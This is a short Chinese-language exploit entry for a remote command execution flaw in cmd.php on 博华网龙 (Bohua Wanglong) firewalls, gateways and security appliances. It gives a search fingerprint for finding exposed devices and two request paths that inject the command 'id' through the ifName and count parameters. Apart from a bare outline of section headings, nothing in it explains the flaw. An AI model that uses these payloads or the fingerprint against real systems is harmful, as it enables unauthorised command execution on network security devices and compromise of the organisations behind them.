# 博华网龙安全设备cmd.php远程命令执行漏洞

- **系统**：博华网龙安全设备cmd.php　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="博华网龙"`

**请求体 / payload**
```
/diagnostics/cmd.php?action=arping&ifName=id

/diagnostics/cmd.php?action=ping&count=id
```

**其他**
- 博华网龙安全设备cmd.php远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 博华网龙防火墙
* 博华网龙信息安全一体机
* 博华网龙安全网关